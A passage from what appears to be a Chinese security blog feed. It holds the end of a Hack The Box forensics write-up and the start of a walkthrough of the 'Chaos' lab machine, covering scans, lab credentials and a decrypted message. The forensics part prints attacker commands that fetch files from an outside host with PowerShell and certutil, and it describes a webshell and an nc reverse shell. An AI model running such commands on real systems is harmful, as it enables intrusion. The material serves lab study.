alt="image-20220609153311443"></p><p>右键追踪TCP流即可：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bat">Microsoft Windows [Version <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">7601</span>]<br>Copyright (c) <span class="hljs-number">2009</span> Microsoft Corporation.  All rights reserved.<br><span class="hljs-function"></span><br><span class="hljs-function">c:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>&gt;<span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">iis</span> <span class="hljs-title">apppool</span>\<span class="hljs-title">defaultapppool</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>&gt;<span class="hljs-title">ipconfig</span></span><br><span class="hljs-function"><span class="hljs-title">ipconfig</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Windows</span> <span class="hljs-title">IP</span> <span class="hljs-title">Configuration</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Ethernet</span> <span class="hljs-title">adapter</span> <span class="hljs-title">Npcap</span> <span class="hljs-title">Loopback</span> <span class="hljs-title">Adapter</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">Connection</span>-<span class="hljs-title">specific</span> <span class="hljs-title">DNS</span> <span class="hljs-title">Suffix</span>  . : </span><br><span class="hljs-function">   <span class="hljs-title">Link</span>-<span class="hljs-title">local</span> <span class="hljs-title">IPv6</span> <span class="hljs-title">Address</span> . . . . . : <span class="hljs-title">fe80</span>::<span class="hljs-title">c519</span>:1<span class="hljs-title">c29</span>:36<span class="hljs-title">a3</span>:3<span class="hljs-title">f06</span>%14</span><br><span class="hljs-function">   <span class="hljs-title">Autoconfiguration</span> <span class="hljs-title">IPv4</span> <span class="hljs-title">Address</span>. . : 169.254.63.6</span><br><span class="hljs-function">   <span class="hljs-title">Subnet</span> <span class="hljs-title">Mask</span> . . . . . . . . . . . : 255.255.0.0</span><br><span class="hljs-function">   <span class="hljs-title">Default</span> <span class="hljs-title">Gateway</span> . . . . . . . . . : </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Ethernet</span> <span class="hljs-title">adapter</span> <span class="hljs-title">Local</span> <span class="hljs-title">Area</span> <span class="hljs-title">Connection</span>:</span><br><span class="hljs-function"><span class="hljs-title">skip</span>-------------------</span><br></code></pre></td></tr></table></figure><p>攻击者收集了一些主机信息。紧接着攻击者调用了powershell内置的远程下载模块远程下载了一个txt文件到c:\users\public\file.txt：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">c:\&gt;<span class="hljs-title">powershell</span> -<span class="hljs-title">ep</span> <span class="hljs-title">bypass</span> -<span class="hljs-title">c</span> <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function"><span class="hljs-title">powershell</span> -<span class="hljs-title">ep</span> <span class="hljs-title">bypass</span> -<span class="hljs-title">c</span> <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">term</span> &#x27;<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span>&#x27; <span class="hljs-title">is</span> <span class="hljs-title">not</span> <span class="hljs-title">recognized</span> <span class="hljs-title">as</span> <span class="hljs-title">the</span> <span class="hljs-title">name</span> <span class="hljs-title">of</span> <span class="hljs-title">a</span> <span class="hljs-title">cmdlet</span>, <span class="hljs-title">functio</span></span><br><span class="hljs-function"><span class="hljs-title">n</span>, <span class="hljs-title">script</span> <span class="hljs-title">file</span>, <span class="hljs-title">or</span> <span class="hljs-title">operable</span> <span class="hljs-title">program</span>. <span class="hljs-title">Check</span> <span class="hljs-title">the</span> <span class="hljs-title">spelling</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">name</span>, <span class="hljs-title">or</span> <span class="hljs-title">if</span> <span class="hljs-title">a</span> <span class="hljs-title">pa</span></span><br><span class="hljs-function"><span class="hljs-title">th</span> <span class="hljs-title">was</span> <span class="hljs-title">included</span>, <span class="hljs-title">verify</span> <span class="hljs-title">that</span> <span class="hljs-title">the</span> <span class="hljs-title">path</span> <span class="hljs-title">is</span> <span class="hljs-title">correct</span> <span class="hljs-title">and</span> <span class="hljs-title">try</span> <span class="hljs-title">again</span>.</span><br><span class="hljs-function"><span class="hljs-title">At</span> <span class="hljs-title">line</span>:1 <span class="hljs-title">char</span>:18</span><br><span class="hljs-function">+ <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> &lt;&lt;&lt;&lt;  -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6U</span></span><br><span class="hljs-function"><span class="hljs-title">RQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function">    + <span class="hljs-title">CategoryInfo</span>          : <span class="hljs-title">ObjectNotFound</span>: (<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest:String</span>) [], <span class="hljs-title">C</span> </span><br><span class="hljs-function">   <span class="hljs-title">ommandNotFoundException</span></span><br><span class="hljs-function">    + <span class="hljs-title">FullyQualifiedErrorId</span> : <span class="hljs-title">CommandNotFoundException</span></span><br></code></pre></td></tr></table></figure><p>但是它失误了，术语“Invoke-WebRequest”不是cmdlet、函数的名称N、脚本文件或可操作程序。检查名称的拼写，或pa，请验证路径是否正确，然后重试。可能是因为powershell版本的原因。紧接着攻击者用windows 白名单程序对其进行了下载：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">c:\&gt;<span class="hljs-title">certutil</span> -<span class="hljs-title">urlcache</span> -<span class="hljs-title">split</span> -<span class="hljs-title">f</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\</span><br><span class="hljs-function"><span class="hljs-title">certutil</span> -<span class="hljs-title">urlcache</span> -<span class="hljs-title">split</span> -<span class="hljs-title">f</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\</span><br><span class="hljs-function">****  <span class="hljs-title">Online</span>  ****</span><br><span class="hljs-function">  0000  ...</span><br><span class="hljs-function">  000<span class="hljs-title">b</span></span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: -<span class="hljs-title">URLCache</span> <span class="hljs-title">command</span> <span class="hljs-title">FAILED</span>: 0<span class="hljs-title">x80070003</span> (<span class="hljs-title">WIN32</span>: 3)</span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: <span class="hljs-title">The</span> <span class="hljs-title">system</span> <span class="hljs-title">cannot</span> <span class="hljs-title">find</span> <span class="hljs-title">the</span> <span class="hljs-title">path</span> <span class="hljs-title">specified</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">c</span>:\&gt;</span><br></code></pre></td></tr></table></figure><p>至此攻击者就不再对服务器有任何的命令交互。经过分析研判，攻击者利用Web服务器弱认证key admin 上传aspx语言的webshell，并利用上传成功的webshell远程下载nc位于c:\users\public目录下，并执行与22.22.22.7：4444建立了反向链接的shell。在此之后只是又下载了一个JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt并将其输出保存到了c:\users\public\。这便是攻击者的攻击路线。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA&quot;</span>|<span class="hljs-built_in">base32</span> -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Digital Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Chaos</title>
    <link href="/post/HackTheBox-Chaos.html"/>
    <url>/post/HackTheBox-Chaos.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Chaos.png" alt="Chaos"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.120<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-22 09:35:24 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 110/tcp on 10.10.10.120                                   <br>Discovered open port 995/tcp on 10.10.10.120                                   <br>Discovered open port 10000/udp on 10.10.10.120                                 <br>Discovered open port 993/tcp on 10.10.10.120                                   <br>Discovered open port 143/tcp on 10.10.10.120                                   <br>Discovered open port 80/tcp on 10.10.10.120                                    <br>Discovered open port 10000/tcp on 10.10.10.120<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.10.120 -p110,995,10000,993,143,80 -oN Chaos            <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 17:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.120<br>Host is up (0.13s latency).<br><br>PORT      STATE SERVICE  VERSION<br>80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))<br>|_http-server-header: Apache/2.4.34 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">110/tcp   open  pop3     Dovecot pop3d</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=chaos</span><br><span class="hljs-string">| Subject Alternative Name: DNS:chaos</span><br><span class="hljs-string">| Not valid before: 2018-10-28T10:01:49</span><br><span class="hljs-string">|_Not valid after:  2028-10-25T10:01:49</span><br><span class="hljs-string">|_pop3-capabilities: RESP-CODES UIDL CAPA PIPELINING STLS SASL AUTH-RESP-CODE TOP</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">143/tcp   open  imap     Dovecot imapd (Ubuntu)</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">|_imap-capabilities: more listed STARTTLS have LITERAL+ capabilities LOGIN-REFERRALS IMAP4rev1 post-login Pre-login SASL-IR OK IDLE ID ENABLE LOGINDISABLEDA0001</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=chaos</span><br><span class="hljs-string">| Subject Alternative Name: DNS:chaos</span><br><span class="hljs-string">| Not valid before: 2018-10-28T10:01:49</span><br><span class="hljs-string">|_Not valid after:  2028-10-25T10:01:49</span><br><span class="hljs-string">993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class="hljs-string">|_imap-capabilities: listed OK more LITERAL+ capabilities LOGIN-REFERRALS IMAP4rev1 have Pre-login SASL-IR post-login IDLE ID ENABLE AUTH=PLAINA0001</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=chaos</span><br><span class="hljs-string">| Subject Alternative Name: DNS:chaos</span><br><span class="hljs-string">| Not valid before: 2018-10-28T10:01:49</span><br><span class="hljs-string">|_Not valid after:  2028-10-25T10:01:49</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">995/tcp   open  ssl/pop3 Dovecot pop3d</span><br><span class="hljs-string">|_pop3-capabilities: RESP-CODES UIDL CAPA PIPELINING USER SASL(PLAIN) AUTH-RESP-CODE TOP</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=chaos</span><br><span class="hljs-string">| Subject Alternative Name: DNS:chaos</span><br><span class="hljs-string">| Not valid before: 2018-10-28T10:01:49</span><br><span class="hljs-string">|_Not valid after:  2028-10-25T10:01:49</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">10000/tcp open  http     MiniServ 1.890 (Webmin httpd)</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 48.40 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.120 -p110,995,10000,993,143,80 -oN Chaos<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ dirsearch -u http://10.10.10.120       <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.120/_22-08-22_17-42-23.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_17-42-23.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.120/<br><br>[17:42:23] Starting: <br>[17:42:30] 403 -  301B  - /.htaccess.orig<br>[17:42:30] 403 -  302B  - /.htaccess_extra<br>[17:42:30] 403 -  299B  - /.htaccess_sc<br>[17:42:30] 403 -  301B  - /.htaccess_orig<br>[17:42:30] 403 -  301B  - /.htaccess.save<br>[17:42:30] 403 -  299B  - /.htaccessOLD<br>[17:42:30] 403 -  301B  - /.htaccess.bak1<br>[17:42:30] 403 -  298B  - /.ht_wsr.txt<br>[17:42:30] 403 -  300B  - /.htaccessOLD2<br>[17:42:30] 403 -  303B  - /.htaccess.sample<br>[17:42:30] 403 -  299B  - /.htaccessBAK<br>[17:42:30] 403 -  291B  - /.htm<br>[17:42:30] 403 -  292B  - /.html<br>[17:42:30] 403 -  297B  - /.htpasswds<br>[17:42:30] 403 -  301B  - /.htpasswd_test<br>[17:42:30] 403 -  298B  - /.httr-oauth<br>[17:42:32] 403 -  291B  - /.php<br>[17:43:19] 200 -   73B  - /index.html<br>[17:43:20] 301 -  317B  - /javascript  -&gt;  http://10.10.10.120/javascript/<br>[17:43:39] 403 -  300B  - /server-status<br>[17:43:39] 403 -  301B  - /server-status/<br>[17:43:52] 301 -  309B  - /wp  -&gt;  http://10.10.10.120/wp/<br>[17:43:53] 200 -  933B  - /wp/<br><br>Task Completed<br>                                                                                                                                        <br>Crazy:~/HackThebox$ dirsearch -u http://chaos.htb/  <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/chaos.htb/-_22-08-22_17-44-14.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_17-44-14.<span class="hljs-built_in">log</span><br><br>Target: http://chaos.htb/<br><br>[17:44:14] Starting: <br>[17:44:18] 301 -  303B  - /js  -&gt;  http://chaos.htb/js/<br>[17:44:20] 403 -  295B  - /.ht_wsr.txt<br>[17:44:20] 403 -  298B  - /.htaccess.bak1<br>[17:44:20] 403 -  298B  - /.htaccess.orig<br>[17:44:20] 403 -  300B  - /.htaccess.sample<br>[17:44:20] 403 -  298B  - /.htaccess_orig<br>[17:44:20] 403 -  296B  - /.htaccess_sc<br>[17:44:20] 403 -  299B  - /.htaccess_extra<br>[17:44:20] 403 -  298B  - /.htaccess.save<br>[17:44:20] 403 -  297B  - /.htaccessOLD2<br>[17:44:20] 403 -  289B  - /.html<br>[17:44:20] 403 -  296B  - /.htaccessBAK<br>[17:44:20] 403 -  296B  - /.htaccessOLD<br>[17:44:20] 403 -  288B  - /.htm<br>[17:44:20] 403 -  294B  - /.htpasswds<br>[17:44:20] 403 -  295B  - /.httr-oauth<br>[17:44:20] 403 -  298B  - /.htpasswd_test<br>[17:44:23] 403 -  288B  - /.php<br>[17:44:35] 200 -    5KB - /about.html<br>[17:44:58] 200 -    5KB - /contact.html<br>[17:44:59] 301 -  304B  - /css  -&gt;  http://chaos.htb/css/<br>[17:45:10] 301 -  304B  - /img  -&gt;  http://chaos.htb/img/<br>[17:45:11] 200 -    7KB - /index.html<br>[17:45:12] 301 -  311B  - /javascript  -&gt;  http://chaos.htb/javascript/<br>[17:45:13] 200 -    2KB - /js/<br>[17:45:32] 403 -  298B  - /server-status/<br>[17:45:32] 403 -  297B  - /server-status<br>[17:45:35] 200 -  938B  - /source/<br>[17:45:35] 301 -  307B  - /source  -&gt;  http://chaos.htb/source/<br><br>Task Completed<br>                                                                                                                              <br>Crazy:~/HackThebox$ <br></code></pre></td></tr></table></figure><p>在80端口藏着一个wordpress站点：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822175523064.png" alt="image-20220822175523064"></p><p>首页有一篇加密的文档，介于作者是human，尝试human解密成功：：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822175814447.png" alt="image-20220822175814447"></p><p>ayush：jiujitsu，是webmail作用域的凭证。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822180057809.png" alt="image-20220822180057809"></p><p>草稿箱中有一些东西：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822180214235.png" alt="image-20220822180214235"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ <span class="hljs-built_in">cat</span> enim_msg.txt <br>0000000000000234���z�سpK8�ZC������^9��kW����&amp;w�9ܾ����E��<span class="hljs-string">&#x27;q�[����9�Z��3����.�C���▒����;��3������6���R`n</span><br><span class="hljs-string">                                                                                                     퍦3�&gt;�&#125;3A����d��FY</span><br><span class="hljs-string">                                                                                                                       ��YDo!��R#~��[��8����a4❄��á&gt;)K�M^�z�I���,��ݨB���qݕYqˏR���q�M�ߟ.w�ʢF�@m�9</span><br><span class="hljs-string">                                                       �JD����(�^�7�5~�&quot;���&#125;��0�?�U�qX(��r�]�w���zGO                                                                                                                                        </span><br><span class="hljs-string">Crazy:~/HackThebox$ cat en.py       </span><br><span class="hljs-string">def encrypt(key, filename):</span><br><span class="hljs-string">    chunksize = 64*1024</span><br><span class="hljs-string">    outputFile = &quot;en&quot; + filename</span><br><span class="hljs-string">    filesize = str(os.path.getsize(filename)).zfill(16)</span><br><span class="hljs-string">    IV =Random.new().read(16)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    encryptor = AES.new(key, AES.MODE_CBC, IV)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    with open(filename, &#x27;</span>rb<span class="hljs-string">&#x27;) as infile:</span><br><span class="hljs-string">        with open(outputFile, &#x27;</span>wb<span class="hljs-string">&#x27;) as outfile:</span><br><span class="hljs-string">            outfile.write(filesize.encode(&#x27;</span>utf-8<span class="hljs-string">&#x27;))</span><br><span class="hljs-string">            outfile.write(IV)</span><br><span class="hljs-string"></span><br><span class="hljs-string">            while True:</span><br><span class="hljs-string">                chunk = infile.read(chunksize)</span><br><span class="hljs-string"></span><br><span class="hljs-string">                if len(chunk) == 0:</span><br><span class="hljs-string">                    break</span><br><span class="hljs-string">                elif len(chunk) % 16 != 0:</span><br><span class="hljs-string">                    chunk += b&#x27;</span> <span class="hljs-string">&#x27; * (16 - (len(chunk) % 16))</span><br><span class="hljs-string"></span><br><span class="hljs-string">                outfile.write(encryptor.encrypt(chunk))</span><br><span class="hljs-string"></span><br><span class="hljs-string">def getKey(password):</span><br><span class="hljs-string">            hasher = SHA256.new(password.encode(&#x27;</span>utf-8<span class="hljs-string">&#x27;))</span><br><span class="hljs-string">            return hasher.digest()</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                                                                                                                        </span><br><span class="hljs-string">Crazy:~/HackThebox$ </span><br></code></pre></td></tr></table></figure><p>顺着特征在谷歌找了个解密脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/mohamed1lar/</span>Python-Scripts<span class="hljs-regexp">/master/</span>crypto.py<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ python encrypt.py<br>Would you like to (E)ncrypt of (D)ecrypt?: D<br>File to decrypt: enim_msg.txt<br>Password: sahay<br>Done.<br>                                                                                                                                        <br>Crazy:~/HackThebox$ <span class="hljs-built_in">ls</span><br>Chaos  Chaos.png  encrypt.py  enim_msg.txt  enim_msg.txt_dec  en.py  lab_Mosaictheory.ovpn<br>                                                                                                                                        <br>Crazy:~/HackThebox$ <span class="hljs-built_in">cat</span> enim_msg.txt_dec <br>SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK<br><br>                                                                                                                                        <br>Crazy:~/HackThebox$ <span class="hljs-built_in">cat</span> enim_msg.txt_dec|<span class="hljs-built_in">base64</span> -d<br>Hii Sahay<br><br>Please check our new service <span class="hljs-built_in">which</span> create pdf<br><br>p.s - As you told me to encrypt important msg, i did :)<br><br>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3<br><br>Thanks,<br>Ayush<br>                                                                                                                                        <br>Crazy:~/HackThebox$ <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822195217351.png" alt="image-20220822195217351"></p><p>尝试路径爆破会失败，</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822195249028.png" alt="image-20220822195249028"></p><p>根据路径名称猜测似乎是叫做一个latex的应用。而且我提交的模板好像失败了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822195707794.png" alt="image-20220822195707794"></p><p>模板2可以：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822195728301.png" alt="image-20220822195728301"></p><p>顺着Latex这条线索搜寻找到了这个：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 